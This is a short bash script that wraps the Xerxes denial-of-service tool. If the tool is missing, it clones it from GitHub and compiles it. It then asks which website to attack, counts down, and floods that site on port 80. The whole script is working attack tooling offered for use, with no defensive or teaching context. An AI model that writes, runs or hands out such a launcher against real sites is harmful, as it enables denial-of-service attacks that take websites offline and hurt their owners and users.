#!/bin/bash
test -f /home/$USER/xerxes/x
if (($?==0)); then
	echo "DDos tool found"
	cd /home/$USER/xerxes
	echo "What site would you like to attack?"
	read site
	echo "You'd like to attack $site, attack starts in 5 sec."
	sleep 1
	clear
	echo "You'd like to attack $site, attack starts in 4 sec."
	sleep 1
	clear
	echo "You'd like to attack $site, attack starts in 3 sec."
	sleep 1
	clear
	echo "You'd like to attack $site, attack starts in 2 sec."
	sleep 1
	clear
	echo "You'd like to attack $site, attack starts in 1 sec."
	sleep 1
	clear
	echo "Attack on site $site starts! to stop press Ctrl+C"
	sleep 4
	./x $site 80
else
	echo "DDos tool Xerxes is missing. Would you like to download it?"
	read bool

	if (($bool==y)); then
	cd /home/$USER
	git clone https://github.com/zanyarjamal/xerxes
	cd /home/$USER/xerxes
	gcc -Wall -o x xerxes.c
	echo "What site would you like to attack?"
	read site
	echo "You'd like to attack $site, attack starts in 5 sec."
	sleep 1
	clear
	echo "You'd like to attack $site, attack starts in 4 sec."
	sleep 1
	clear
	echo "You'd like to attack $site, attack starts in 3 sec."
	sleep 1	
	clear
	echo "You'd like to attack $site, attack starts in 2 sec."
	sleep 1
	clear
	echo "You'd like to attack $site, attack starts in 1 sec."
	sleep 1
	clear
	echo "Attack on site $site starts! to stop press Ctrl+C"
	sleep 4
	./x $site 80	
else
	echo "Ok!"
	fi
fi




